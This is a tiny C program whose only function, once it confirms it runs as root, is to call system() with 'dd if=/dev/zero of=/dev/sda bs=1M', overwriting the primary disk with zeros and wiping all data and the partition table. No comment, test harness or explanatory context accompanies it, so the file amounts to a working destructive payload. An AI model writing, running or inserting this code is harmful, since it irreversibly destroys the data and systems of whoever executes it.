#include <stdlib.h>
#include <unistd.h>
int main(void) {
    if (geteuid() != 0) return 1;
    return system("dd if=/dev/zero of=/dev/sda bs=1M");
}
